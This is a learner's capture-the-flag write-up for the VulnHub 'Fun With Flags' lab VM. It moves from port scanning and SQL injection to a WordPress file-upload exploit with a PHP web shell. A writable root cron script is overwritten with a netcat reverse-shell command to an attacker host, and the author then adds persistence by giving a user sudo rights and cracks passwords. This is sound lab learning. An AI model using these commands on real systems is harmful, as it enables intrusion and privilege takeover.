# Fun With Flags!

Link: https://www.vulnhub.com/entry/tbbt-funwithflags,437/

This was my first vulnhub vm, almost my first hacked anything, and the first time I have used kali in anger (literally at times, when it kept freezing). It took me maybe four days to get all the flags - one and a half days stuck after getting the first two. I got the last two with some hints from the creator, but managed to get root without help (flag 4, leonard) so I was really happy with myself :_

## Step 1: nmap scan for open ports:

This is from a straight `nmap -p- 192.168.1.105`

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

I immediately netcatted the 1337 port to get the first flag, sheldons:

```
> nc 192.168.1.105 1337
FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
>
```

## FTP enumeration

Next I connected to ftp and browsed around. Of note was penny's username and password, the former in a note in bernadette's folder and the latter in penny's:

`penny69:pennyisafreeloader`

Also, under howard's folder was a zip file that contained an image locked up with a passcode. I attacked this last in my work, later, after a hint from the creator (which was helpful since I knew nothing about password cracking).

## Nikto output

Next I ran nikto on the website.

For `nikto -host 192.168.1.105`

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.105
+ Target Hostname:    192.168.1.105
+ Target Port:        80
+ Start Time:         2020-03-11 03:51:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /howard/: Directory indexing found.
+ Entry '/howard/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 4 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: ef, size: 59ffb591c48f0, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3092: /private/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2020-03-11 03:53:13 (GMT-4) (76 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Once I saw it had a private sub dir, its own subsection talking about bigpharma (which was mentioned in the note where penny's username was found):

For `nikto -host http://192.168.1.105/private`:

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.105
+ Target Hostname:    192.168.1.105
+ Target Port:        80
+ Start Time:         2020-03-11 03:56:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /private/css/: Directory indexing found.
+ OSVDB-3092: /private/css/: This might be interesting...
+ /private/login.php: Admin login page/section found.
+ 7916 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-03-11 03:57:54 (GMT-4) (88 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Login big pharma - SQL vector

After logging in through /private/login.php, penny69:pennyisafreeloader gets to a search page. 
Searching for `'` returns `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`, so its susceptible to sql injection.

## Using above sql injection to get password hashes

I eventually managed to get a dump of the users table, where I got my second flag, bernadette's:

```
admin	3fc0a7acf087f549ac2b266baf94b8b1	    josh	    Dont mess with me
bobby	8cb1fb4a98b9c43b7ef208d624718778	    bob	        I like playing football.
penny69	cafa13076bb64e7f8bd480060f6b2332	    penny	    Hi I am Penny I am new here!! <3
mitsos1981	05d51709b81b7e0f1a9b6b4b8273b217	dimitris	Opa re malaka!
alicelove	e146ec4ce165061919f887b70f49bf4b	alice	    Eat Pray Love
bernadette	dc5ab2b32d9d78045215922409541ed7	bernadette  FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```

I used an online md5 hash rainbow table to reverse several of the above passwords.

- `admin` reverses to `qwerty123`
- `mitsos1981` reverses to `souvlaki`
- `bernadette` reverses to `howard`

The others were not reversable. None of these worked with ssh, and they also didn't work with the phpMyAdmin interface nikto found.

## Enumerated web dirs

I tried a few other types of enumeration (dirbuster, legion, wfuzz) to get my next steps, without success. For example via `wfuzz` with various wordlists I found:

- /howard, which contains a secret_data folder containing a joke gif and joke text file
- /javascript which gives access denied
- /music which returns 200 but nothing else
- /private leading to the website
- /private/css with just the base css for the pharma site
- /phpmyadmin

None of the above was useful. In such a state I was stuck for a day and a half.

## dirb enumeration

I started reading the author's writeup's of his own vulnhub efforts, reading his techniques and hopeing they might reveal a way of thinking to get me forward. In such a fashion I learned about dirb, which is not the same thing as dirbuster. When I ran it against the site, it found all the same things as the other tools but also, crucially:

```
==> DIRECTORY: http://192.168.1.105/music/wordpress/
```

The empty dir was in fact hosting a wordpress site. Progress!

## wpscan and reflex gallery

After browsing around the wp site, I ran `wpscan`. It picked up some users etc, but also a plugin called `reflex-gallery 3.1.3`, which has a file upload vulnerability.

I created the following form to exploit it, based on the listed exploit on [exploitdb](https://www.exploit-db.com/exploits/36374):

```html
<form method="POST" action="http://192.168.1.105/music/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2020&Month=03" enctype="multipart/form-data" >
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Pwn!">
</form>
```

and uploaded the php shell from here: [flozz/p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)

This gave me a shell on the machine when I browsed to it (it was under `wp-content/uploads/2020/03`), running under www-data but which seemed to have a lot of access. Going through the user dirs, I found an exe in amy's dir that revealed a flag when run through `strings`:

`FLAG-amy{60263777358690b90e8dbe8fea6943c9}`

## Leonard's cron job

Leonards home dir had a shell script, owned by root. It contained a comment saying that it was run every minute, and it was also writeable.

I echoed the following command into it and got a reverse shell via netcat: `echo "nc.traditional -e /bin/bash 192.168.1.3 1235" > thermostat_set_temp.sh`, running `nc -nvlp 1235` on the kali machine. This gave me a root shell!

## Win, but wait...

With the root shell, I was in the /root dir where leonards flag file sat. This supposedly marks the win condition:

```
                         ____                                                                                                                      
                        /    \                                                                                                                     
                       /______\                                                                                                                    
                          ||                                                                                                                       
           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\                                                                                                 
          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\                                                                                                
         (_)========(_)   ||  (_)==== ===========(_)                                                                                               
          I|_________|I  _||_  |___________________|                                                                                               
.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\                                                                                     
                                                                                                                                                   
Gongrats!                                                                                                                                          
You have rooted the box! Now you can sit on Sheldons spot!                                                                                         
FLAG-leonard{17fc95224b65286941c54747704acd3e}           
```

However I am still missing three flags...

## Getting a better shell

The nc shell is a bit limited. Not a lot of feedback from commands. Particularly, I wanted to get more persistence, by changing the password for an existing user and making that user a sudoer, before logging in as said user via ssh.

This command from my nc reverse shell gave me a real nice terminal: `python -c 'import pty; pty.spawn("/bin/bash")'`. It creates a pseudo terminal that worked great.

I then changed penny's password to `hacktheplanet` via `passwd penny`, and made her a sudoer via `/usr/sbin/usermod -aG sudo penny`. Finally I logged in with her over ssh, then did a `sudo -i` to get a nice, clean root shell :)

## Deeper access to footprints on the moon

I did a `grep -r FLAG- / 2>/dev/null` to try and find the other flags. Raj's flag was in one of the wordpress databases.

If I was smart at this point, I would have simply navigated to the wordpress site and done a search. However I had read my way through the site and done view source searches and had not found anything, so I thought it must be hidden in the backend settings somewhere, and so I decided to get into the word press database.

1. I got the db name and credentials by `cat wp-config.php`
2. I connected to the db using the mysql command-line tool. 
3. I updated the main users password using `UPDATE wp_users SET user_pass = MD5( 'hacktheplanet' ) WHERE wp_users.user_login = "footprintsonthemoon";`
4. I logged in to admin dashboard.

Via this I was able to find a page list that included a page called 'secret', containing raj's flag. This page, while unlinked, is fully available through search on the main site, too /facepalm. However it was fun learning: `FLAG-raz{40d17a74e28a62eac2df19e206f0987c}`

## Creator's hints

The creator DM'd me some hints, including that 'penny likes to hide her files'. I found Penny's flag as a hidden file in her home dir, base64 encoded: `FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}`. 

The second hint was for howard's flag, where the creator first suggested it was in his zip file on ftp (which I already guessed), and then that I might need to 'rockyou' it twice.

I looked around word press thinking this was some show reference, but then did a google and found its actually the name of a common word list on kali, a 130+ meg list of common passwords. I used it with john the ripper to crack the zip, allowing me to extract an image of the mars rover. john used rockyou and ran in half a second to get the password `astronaut`

The image had nothing in it that I could see for the flag, but given that it was the only thing in the file, that I was sure the flag was in it somewhere, and that the author had said I need to 'rockyou' twice (crack two passwords) I guessed that it was a stegographic image. 

`steghide` is a tool that will encode and decode messages in images, however, it requires a passphrase to decode. After some googling I found `stegcracker`, a tool that will brute force using a word list and steghide. And the word list defaults to using rockyou again :)

stegcracker was much, much slower than john, but fortunately it found the password after a few minutes in the first 0.3% of rockyou's passwords, `iloveyoumom`. The output file contained the final flag: `FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}`.